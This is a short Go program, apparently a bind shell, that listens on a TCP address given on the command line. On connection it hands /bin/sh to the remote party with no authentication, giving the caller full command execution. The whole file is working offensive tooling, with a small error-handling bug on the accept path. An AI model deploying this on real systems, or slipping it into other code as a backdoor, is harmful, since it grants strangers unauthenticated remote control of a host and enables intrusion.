package main 


import (

	"log"
	"net"
	"os"
	"os/exec"
)

// main function  

func main() {

	// call the connection function  
	connection()

}

// connection function 
func connection() {

	if len(os.Args) < 2 {

		log.Fatal("You need to provide an argument, i.e bind_shell.go ", " 0.0.0.0:8910 ")
		os.Exit(1)

	} 

	// listen and accept connection 
	listen, err := net.Listen("tcp", os.Args[1])

	if err != nil {

		log.Fatal("Error creating connection on ", os.Args[1])
		os.Exit(1)
	}

	log.Println("Listening for connection on ", os.Args[1])
	log.Println(" ")

	// accept connection from remote address
	for {

		// accept connection 
		con, err := listen.Accept()

		if err != nil {

			log.Fatal("Error accepting connection form ", con.RemoteAddr() , "\n",err)
		}

		// process and handle connection if no error was encountered
		log.Println("Received connection from ", con.RemoteAddr())

		con.Write([]byte("connection established .... opened '/bin/sh' shell .. \n"))

		// execute commands 
		command := exec.Command("/bin/sh")

		command.Stdin = con 
		command.Stdout = con 
		command.Stderr = con 
		command.Run()

		log.Printf(" shell closed \n")
		os.Exit(1)
	}
}
